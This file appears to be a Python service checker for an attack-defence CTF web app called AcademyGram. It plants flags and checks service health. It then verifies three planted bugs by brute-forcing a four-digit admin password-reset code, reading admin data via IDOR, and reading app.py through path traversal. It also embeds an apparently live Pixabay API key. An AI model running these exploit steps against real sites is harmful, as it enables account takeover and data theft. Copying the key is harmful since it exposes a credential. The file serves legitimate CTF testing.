#!/usr/bin/env python3
import requests
import random
import sys
import os
import string
from contextlib import contextmanager

# --- CTF Gameserver Library Stub ---
class CheckerResult:
    OK = 'OK'
    DOWN = 'DOWN'
    FAULTY = 'FAULTY'

class BaseChecker:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.base_url = f"http://{self.ip}:{self.port}"
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'AcademyGram Checker'})
        self.timeout = 10

    def place_flag(self, tick):
        raise NotImplementedError()

    def check_service(self, tick):
        raise NotImplementedError()

    def run(self, action, tick=None):
        try:
            if action == 'place_flag':
                return self.place_flag(tick)
            elif action == 'check_service':
                return self.check_service(tick)
        except Exception as e:
            print(f"[-] An unexpected error occurred: {e}", file=sys.stderr)
            return CheckerResult.DOWN, "Checker failed"

# --- AcademyGram Checker ---

class AcademyGramChecker(BaseChecker):
    
    PIXABAY_API_KEY = "51875202-47194d033d9270a5a93b607a6"
    
    def _random_string(self, length=12):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    @contextmanager
    def _login(self, username, password):
        try:
            login_data = {'username': username, 'password': password}
            r = self.session.post(f"{self.base_url}/login", data=login_data, timeout=self.timeout, allow_redirects=False)
            r.raise_for_status()
            if r.status_code != 302 or '/login' in r.headers.get('Location', ''):
                raise ConnectionError(f"Login failed for {username}")
            print(f"[+] Logged in as {username}")
            yield self.session
        finally:
            self.session.get(f"{self.base_url}/logout")
            print(f"[-] Logged out {username}")

    def _get_random_bot_user(self):
        bots = ["Gluncho", "brightprogrammer", "Saan", "InkaDinka", "CROWNPRINCE", "Ze:R0"]
        return random.choice(bots)

    def _fetch_image_from_pixabay(self):
        query = random.choice(["sun", "machine", "moon", "flower", "great"])
        page = random.randint(1, 10)
        url = f"https://pixabay.com/api/?key={self.PIXABAY_API_KEY}&q={query}&image_type=photo&per_page=20&page={page}"
        
        try:
            resp = requests.get(url, timeout=self.timeout)
            resp.raise_for_status()
            data = resp.json()
            if data.get("hits"):
                choice = random.choice(data["hits"])
                img_url = choice.get("webformatURL")
                img_data = requests.get(img_url, timeout=self.timeout).content
                return img_data, choice.get("tags", "A cool image")
        except requests.exceptions.RequestException as e:
            print(f"[-] Pixabay API call failed: {e}", file=sys.stderr)
        return None, None

    def place_flag(self, tick):
        flag = f"FLAG{{{self._random_string(32)}}}"
        bot_password = os.environ.get("BOT_PASSWORD", "CHANGEME_bot_password")
        admin_password = os.environ.get("ADMIN_PASSWORD", "CHANGEME_admin_password123")

        # 1. Bot Activity
        bot_user = self._get_random_bot_user()
        try:
            with self._login(bot_user, bot_password):
                image_data, tags = self._fetch_image_from_pixabay()
                if image_data:
                    post_data = {'content': f"Exploring the world of {tags}! #bots"}
                    files = {'image': ('post.jpg', image_data, 'image/jpeg')}
                    self.session.post(f"{self.base_url}/add_post", data=post_data, files=files, timeout=self.timeout)
        except (ConnectionError, requests.exceptions.RequestException) as e:
            print(f"[*] Bot activity failed, but not critical: {e}", file=sys.stderr)

        # 2. Flag Placement
        try:
            with self._login("admin", admin_password):
                # Flag in a private post
                post_data = {'content': f"Confidential project notes: {flag}", 'is_private': 'on'}
                r_post = self.session.post(f"{self.base_url}/add_post", data=post_data, allow_redirects=False)
                if r_post.status_code != 302:
                    return CheckerResult.FAULTY, "Failed to create private post with flag"
                
                # Flag in admin's interests
                interests_data = {'user_id': 1, 'interests': f"Top Secret Research,{flag},Zero-Day Hunting"}
                r_interests = self.session.post(f"{self.base_url}/api/update_interests", json=interests_data)
                if r_interests.status_code != 200:
                    return CheckerResult.FAULTY, "Failed to update admin interests with flag"
                
                print(f"[*] Flag for tick {tick} placed: {flag}")
                with open(f"/tmp/flag_tick_{tick}.txt", "w") as f:
                    f.write(flag)
                return CheckerResult.OK, "Flag placed"
        except (ConnectionError, requests.exceptions.RequestException) as e:
            return CheckerResult.DOWN, f"Failed to log in as admin and place flag: {e}"

    def check_service(self, tick):
        # --- Service Health Checks ---
        try:
            # Check main page
            r = self.session.get(self.base_url, timeout=self.timeout)
            if r.status_code != 200:
                return CheckerResult.DOWN, "Main page is not accessible"
            # Check login page
            r_login = self.session.get(f"{self.base_url}/login", timeout=self.timeout)
            if r_login.status_code != 200 or "login" not in r_login.text.lower():
                return CheckerResult.FAULTY, "Login page seems broken"
            # Check register page
            r_register = self.session.get(f"{self.base_url}/register", timeout=self.timeout)
            if r_register.status_code != 200 or "register" not in r_register.text.lower():
                return CheckerResult.FAULTY, "Register page seems broken"
        except requests.exceptions.RequestException:
            return CheckerResult.DOWN, "Failed to connect to service for health checks"

        # --- Functionality Checks ---
        username = self._random_string()
        password = self._random_string()
        try:
            # Register
            register_data = {'username': username, 'password': password}
            r_reg = self.session.post(f"{self.base_url}/register", data=register_data, allow_redirects=False)
            if r_reg.status_code != 302:
                return CheckerResult.FAULTY, "Registration failed"
            
            # Login/Logout
            with self._login(username, password):
                # Create public post
                public_post_content = f"Public post by {username}"
                self.session.post(f"{self.base_url}/add_post", data={'content': public_post_content})
                
                # Create private post
                private_post_content = f"Private post by {username}"
                self.session.post(f"{self.base_url}/add_post", data={'content': private_post_content, 'is_private': 'on'})

                # Verify posts on profile
                r_profile = self.session.get(f"{self.base_url}/profile/{username}")
                if public_post_content not in r_profile.text or private_post_content not in r_profile.text:
                    return CheckerResult.FAULTY, "Posts not appearing on profile"
        except (ConnectionError, requests.exceptions.RequestException) as e:
            return CheckerResult.FAULTY, f"Core functionality check failed: {e}"

        # --- Vulnerability Checks (Exploitation) ---
        try:
            with open(f"/tmp/flag_tick_{tick}.txt", "r") as f:
                flag = f.read().strip()
        except FileNotFoundError:
            return CheckerResult.OK, "Service is up, but no flag to check for this tick"

        # Bug 1: Password Reset
        try:
            self.session.post(f"{self.base_url}/forgot_password", data={'username': 'admin'})
            new_password = self._random_string()
            for code in range(1000, 10000):
                reset_data = {'code': str(code).zfill(4), 'new_password': new_password}
                r_reset = self.session.post(f"{self.base_url}/reset_password/admin", data=reset_data, allow_redirects=False)
                if r_reset.status_code == 302:
                    print(f"[+] Bruteforced admin password with code {code}")
                    with self._login("admin", new_password):
                        r_profile = self.session.get(f"{self.base_url}/profile/admin")
                        if flag not in r_profile.text:
                            return CheckerResult.FAULTY, "Bug 1: Flag not found in admin's private post after password reset"
                    break
            else:
                return CheckerResult.FAULTY, "Bug 1: Could not bruteforce password reset code"
        except (ConnectionError, requests.exceptions.RequestException) as e:
            return CheckerResult.FAULTY, f"Bug 1 check failed: {e}"

        # Bug 2: IDOR
        try:
            with self._login(username, password):
                r_idor = self.session.get(f"{self.base_url}/interests?user_id=1")
                if flag not in r_idor.text:
                    return CheckerResult.FAULTY, "Bug 2: Flag not found in admin's interests via IDOR"
        except (ConnectionError, requests.exceptions.RequestException) as e:
            return CheckerResult.FAULTY, f"Bug 2 check failed: {e}"

        # Bug 3: LFI
        try:
            # This is a check for the vulnerability, not for a flag
            r_lfi = self.session.get(f"{self.base_url}/view_file?filename=../../app.py&uploads=true")
            if "Flask" not in r_lfi.text:
                return CheckerResult.FAULTY, "Bug 3: LFI vulnerability not working as expected"
        except requests.exceptions.RequestException as e:
            return CheckerResult.FAULTY, f"Bug 3 check failed: {e}"

        return CheckerResult.OK, "All checks passed"


if __name__ == "__main__":
    if len(sys.argv) not in [4, 5]:
        print(f"Usage: python {sys.argv[0]} <ip> <port> <action> [tick]")
        sys.exit(1)

    ip, port, action = sys.argv[1], int(sys.argv[2]), sys.argv[3]
    tick = int(sys.argv[4]) if len(sys.argv) == 5 else random.randint(1, 1000)

    checker = AcademyGramChecker(ip=ip, port=port)
    
    result, message = checker.run(action, tick)

    print(f"Result: {result}\nMessage: {message}")
    if result != CheckerResult.OK:
        sys.exit(1)
